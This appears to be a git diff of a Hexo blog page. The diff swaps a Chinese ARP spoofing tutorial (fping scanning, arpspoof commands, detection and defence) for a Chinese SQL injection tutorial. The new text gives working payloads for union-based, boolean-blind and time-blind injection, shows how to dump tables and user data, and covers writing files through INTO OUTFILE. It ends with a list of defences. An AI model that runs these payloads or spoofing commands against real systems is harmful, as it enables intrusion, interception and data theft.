@@ -15,7 +15,7 @@
 
 
 
-<title>arp欺骗 | Hexo</title>
+<title>SQL注入 | Hexo</title>
 
 
 
@@ -153,7 +153,7 @@
         </h2>
       </a>
       <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
-        arp欺骗
+        SQL注入
       </div>
       <div class="flex-1"></div>
       <div class="flex items-center gap-3">
@@ -214,72 +214,120 @@
   <header class="overflow-hidden pt-6 pb-6 md:pt-12">
     <div class="pt-4 md:pt-6">
       <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
-        arp欺骗
+        SQL注入
       </h1>
       <p class="mb-6">
         
       </p>
       <div>
         <section class="flex items-center gap-3 text-sm">
-          <time>2023-08-08 00:47:49</time>
+          <time>2023-08-12 17:14:08</time>
           <span class="text-gray-400">·</span>
-          <span>2 min</span>
+          <span>7 min</span>
           <span class="text-gray-400">·</span>
-          <span>649 words</span>
+          <span>2k words</span>
         </section>
       </div>
     </div>
   </header>
   <!-- content -->
   <article class="post-content mt-10 prose dark:prose-invert post-content">
-    <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>​		要想进行局域网攻击，攻击设备和被攻击设备一定要在一个局域网中，即处于同一网段</p>
-<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，将IP地址转换为对应的mac地址，属链路层协议<br>数据包分为：</p>
-<p>请求包（广播）：本机IP地址、mac地址+目标主机IP地址<br>应答包（单播）：本机IP地址、mac地址+来源主机IP地址、mac地址	</p>
-<p>​	</p>
-<p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议</p>
-<h2 id="ARP欺骗的基本原理"><a href="#ARP欺骗的基本原理" class="headerlink" title="ARP欺骗的基本原理"></a>ARP欺骗的基本原理</h2><p><img src="/arp%E6%AC%BA%E9%AA%97.assets/image-20230808004141908.png" alt="image-20230808004141908"></p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
-<li>安装dsniff数据包</li>
+    <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>​		攻击者通过web应用程序利用SQL语句或字符串将非法的数据插入到服务端数据库中，获取数据库的用户管理权限，然后将数据库管理用户权限升至操作系统管理用户权限，控制服务器操作系统，获取重要的信息和机密文件。所谓的sql注入就是通过某种方式将恶意的sql代码添加到输入参数中，然后传递到sql服务器使其解析并执行的一种攻击手法</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>数据泄露：数据库中存放的用户的隐私信息的泄露</li>
+<li>网页篡改：通过操作数据库对特定网页进行篡改</li>
+<li>网站挂马：修改数据库一些字段的值，嵌入链接，实行攻击</li>
+<li>数据破坏：数据库服务器被攻击，数据库的系统管理员账户被篡改，系统瘫痪</li>
+<li>服务器被远程控制：经由数据库服务器提供的操作系统支持，让我们可以修改或者控制操作系统</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get insyall dsniff</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看本机网卡及IP地址</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>嗅探本机所在WLAN下所有设备的IP地址</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -g IP/24</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>对目标主机进行ARP攻击</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目标主机中输入查看ARP缓存</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>在本机按下Ctrl+c停止攻击</p>
+<h5 id="按注入点分"><a href="#按注入点分" class="headerlink" title="按注入点分"></a>按注入点分</h5><ul>
+<li><p>数字型注入</p>
 </li>
-<li><p>目标主机ARP缓存恢复</p>
+<li><p>字符型注入</p>
 </li>
 </ul>
-<h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul>
-<li>网络频繁掉线</li>
-<li>网速突然变慢</li>
-<li>使用arp -a命令查看的网关mac地址与真实的网关mac地址不同</li>
-<li>使用嗅探软件发现局域网内存在大量arp应答包</li>
+<h5 id="按返回结果分"><a href="#按返回结果分" class="headerlink" title="按返回结果分"></a>按返回结果分</h5><ul>
+<li>报错型</li>
+<li>盲注型</li>
 </ul>
-<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul>
-<li>绑定mac地址</li>
-<li>使用静态arp缓存表</li>
-<li>使用arp服务器，通过服务器来查找arp转换表来响应其他机器的广播</li>
-<li>使用arp欺骗防护软件</li>
+<h5 id="按提交数据分"><a href="#按提交数据分" class="headerlink" title="按提交数据分"></a>按提交数据分</h5><ul>
+<li>GET注入：在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句</li>
+<li>POST注入：通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的</li>
+<li>Cookie注入：有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息</li>
+</ul>
+<h3 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h3><p>​		通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx/abcd.php?id=XX">http://xxx.xxx.xxx/abcd.php?id=XX</a><br>对 Sql 注入的判断，主要有两个方面</p>
+<ul>
+<li><p>判断该带参数的 Url 是否存在 Sql 注入？</p>
+</li>
+<li><p>如果存在 Sql 注入，那么属于哪种 Sql 注入？</p>
+<p>​		可能存在Sql注入攻击的ASP&#x2F;PHP&#x2F;JSP动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数。有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在Sql注入。如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大</p>
+</li>
+</ul>
+<h4 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h4><p>最为经典的单引号判断法：在参数后面加上单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面返回错误，则存在Sql注入<br>原因是无论字符型还是整型都会因为单引号个数不匹配而报错<br>（如果未报错，不代表不存在Sql注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）</p>
+<h4 id="判断SQL注入漏洞的类型"><a href="#判断SQL注入漏洞的类型" class="headerlink" title="判断SQL注入漏洞的类型"></a>判断SQL注入漏洞的类型</h4><h6 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h6><ul>
+<li>Url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>页面依旧运行正常，继续进行下一步</li>
+<li>Url地址中继续输入<code>http://xxx/abc.php?id=x and 1=2</code>页面运行错误，则说明此Sql注入为数字型注入</li>
+</ul>
+<h6 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h6><ul>
+<li>Url地址中输入<code>http://xxx/abc.php?id=x&#39; and &#39;1&#39;=&#39;1</code>页面运行正常，继续进行下一步</li>
+<li>Url地址中继续输入<code>http://xxx/abc.php?id=x&#39; and &#39;1&#39;=&#39;2</code>页面运行错误，则说明此Sql注入为字符型注入</li>
+</ul>
+<h5 id="判断当前表的字段个数"><a href="#判断当前表的字段个数" class="headerlink" title="判断当前表的字段个数"></a>判断当前表的字段个数</h5><p><code>?id=1 order by n --+</code></p>
+<p>若n超过当前表的列数，就会报错，说明表中只有n-1列</p>
+<h5 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h5><p>判断显示位时，要使用<code>?id=-1或者改为0</code>让前面的select语句查询为空错误，然后采用后面的select语句去查询</p>
+<p><code>?id=-1’ union select 1,2,3 --+</code></p>
+<p>观察页面在哪里回显我们的输入，就可以用那个地方测试接下的语句</p>
+<h5 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h5><p>假如2号位是回显位：</p>
+<p><code>?id=1’ union select 1,database(),3 --+</code></p>
+<p>在之前回显2的地方会回显database数据库的名字</p>
+<h5 id="爆数据库中的表"><a href="#爆数据库中的表" class="headerlink" title="爆数据库中的表"></a>爆数据库中的表</h5><p><code>?id=1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
+<h5 id="爆表中的字段"><a href="#爆表中的字段" class="headerlink" title="爆表中的字段"></a>爆表中的字段</h5><p><code>?id=1’ union select 1,group_concat(column_name),3 from information_schema.column where table_schema=’爆出来的数据库名‘ and table_name=‘爆出来的表名’ --+</code></p>
+<h5 id="爆相应字段的所有数据"><a href="#爆相应字段的所有数据" class="headerlink" title="爆相应字段的所有数据"></a>爆相应字段的所有数据</h5><p><code>?id=-1’ union select 1,group_concat(字段名),3 from users --+</code></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​		就是在mysql中使用指定函数来制造报错，查询的时候加一些格式错误的信息，它会提示你格式错误，可以在中间加入一些其他信息，比如select database()，报错信息后面也会出现数据库信息。利用数据库的报错信息得到数据库的内容。因此需要构造语句让数据库报错</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
+<li>求闭合字符</li>
+<li>求当前数据库名的长度</li>
+<li>求当前数据库名对应的ASCII值</li>
+<li>求表的数量</li>
+<li>求表明的长度</li>
+<li>求表名对应的ASCII值</li>
+<li>求字段的数量</li>
+<li>求字段内容的长度</li>
+<li>求字段内容对应的ASCII值</li>
+</ul>
+<h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><p> if(a&#x3D;b,1,2)</p>
+<p>当a&#x3D;b为真时，返回1；当a&#x3D;b为假时，返回2</p>
+<h4 id="substr语句"><a href="#substr语句" class="headerlink" title="substr语句"></a>substr语句</h4><p>substr(x,a,b)</p>
+<p>从第a位开始截取“x”，每次截取b位</p>
+<p>substr(‘admin’,1,1)&#x3D;’a’;substr(‘admin’,2,1)&#x3D;’d’</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>​		即在页面不显示数据，只显示对错，此时我们输入的语句让页面呈现两种状态，相当于true和false，根据这两种状态判断我们输入的语句是否查询成功。因此需要构造判断语句，根据页面是否回显证实猜想</p>
+<h5 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h5><p><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</code></p>
+<h5 id="判断每个表的长度"><a href="#判断每个表的长度" class="headerlink" title="判断每个表的长度"></a>判断每个表的长度</h5><p><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</code></p>
+<h5 id="判断每个表的每个字符的ascii值"><a href="#判断每个表的每个字符的ascii值" class="headerlink" title="判断每个表的每个字符的ascii值"></a>判断每个表的每个字符的ascii值</h5><p><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</code></p>
+<h5 id="判断表中的字段名"><a href="#判断表中的字段名" class="headerlink" title="判断表中的字段名"></a>判断表中的字段名</h5><h5 id="判断数据长度"><a href="#判断数据长度" class="headerlink" title="判断数据长度"></a>判断数据长度</h5><p><code>?id=1&#39; and length((select id from users limit 0,1))&gt;5 --+</code></p>
+<h5 id="判断数据的ASCII值"><a href="#判断数据的ASCII值" class="headerlink" title="判断数据的ASCII值"></a>判断数据的ASCII值</h5><p><code>?id=1&#39; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</code></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>​		通过返回时间的长短判断。获取第一个字符的ascii码，判断是否大于115，不成立延时五秒返回</p>
+<p><code>?id=1&#39; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</code></p>
+<h4 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h4><p><code>SELECT … INTO OUTFILE ‘file_name’</code></p>
+<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。两种利用形式：</p>
+<ul>
+<li>直接将select内容导入到文件中</li>
+</ul>
+<p><code>select ... into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot;</code></p>
+<ul>
+<li>修改文件结尾</li>
+</ul>
+<p><code>select version() into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; LINES TERMINATED BY 0x16</code></p>
+<h3 id="应对方案"><a href="#应对方案" class="headerlink" title="应对方案"></a>应对方案</h3><ul>
+<li>参数过滤： 参数过滤以各种厂商以及代码的WAF为主,比如替换空格,关键字,双写,大小写,特殊字符转义</li>
+<li>普通用户与系统管理员用户的权限要有严格的区分</li>
+<li>预编译：预编译主要依赖各种框架,比如Java的mybatis框架 和 PHP的 thinkphp框架</li>
+<li>限制权限和报错：限制权限和报错是指限制数据库的权限,以及控制数据库的报错信息,报错信息不要对外展示</li>
+<li>必要的情况下使用专业的漏洞扫描工具来寻找可能被攻击的点</li>
+<li>防火墙，限制同IP时间、禁IP访问、黑名单</li>
 </ul>
 
   </article>
@@ -291,16 +339,16 @@
   <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
     <div>
       
-        <a href="/2023/08/12/SQL%E6%B3%A8%E5%85%A5/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+        <a href="/2023/08/12/PHP/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
           <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
-          SQL注入
+          PHP
         </a>
       
     </div>
     <div>
       
-        <a href="/2023/08/07/mysql/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          mysql
+        <a href="/2023/08/08/arp%E6%AC%BA%E9%AA%97/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          arp欺骗
           <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
         </a>
       
